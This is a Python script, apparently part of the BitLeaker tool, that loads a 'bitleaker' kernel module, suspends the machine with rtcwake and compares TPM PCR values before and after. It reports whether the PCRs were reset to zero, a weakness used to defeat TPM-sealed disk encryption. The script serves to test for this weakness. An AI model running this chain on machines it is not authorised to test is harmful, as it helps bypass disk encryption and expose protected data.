#!/usr/bin/env python

import os
import sys
import subprocess
from time import sleep

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
SUCCESS = GREEN
FAIL = RED

#
# Print colored message
#
def color_print(message, color):
    sys.stdout.write(color + message + ENDC)
    return

def info_print(message):
    color_print(message, BOLD)

AFEW = 10

def get_pcrs():
    info_print('Getting PCR values\n')
    output = subprocess.check_output('sudo tpm2_pcrread', shell=True).split(b'\n')

    d = {}
    hash = None

    for l in output:
        print(l)
        if l == b'':
            pass
        elif l[0] != ord(' '):
            hash = l[:-1]
            d[hash] = {}
        else:
            n, v, *ignore = l.split(b":")
            d[hash][int(n)] = int(v[1:], 16)

    #print(d)

    #sys.exit(1)

    return d

def suspend():
    info_print('Sleeping for a few seconds\n')
    subprocess.check_output('sudo rtcwake -m mem -s %d' % AFEW, shell=True)

    info_print('Waking up\n')

    sleep(1)


output = get_pcrs()

hash = next(iter(output))

if 0 not in output[hash]:
    color_print("Unable to find PCR 0\n", FAIL)
    sys.exit(1)

# Fix me for non SHA 256...
if output[hash][0] == 0:
    color_print("PCR 0 was already zero", FAIL)
    sys.exit(1)

kernel_module_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "bitleaker-kernel-module/bitleaker-kernel-module.ko")

info_print('Loading bitleaker kernel module\n')
subprocess.check_output('sudo insmod %s' % kernel_module_path, shell=True)

suspend()

newoutput = get_pcrs()

if False:
    for l in output:
        info_print('%s\n' % l)

    for l in newoutput:
        info_print('%s\n' % l)

zero = False

for pcr in output[hash].keys():
    old = output[hash][pcr]
    new = newoutput[hash][pcr]
    
    if old != new:
        color_print("PCR %d changed from %s to %s\n" % (pcr, old, new), GREEN)
        if new == 0:
            zero = True

if not zero:
    color_print("Machine does not appear to be vulnerable", FAIL)
    sys.exit(1)
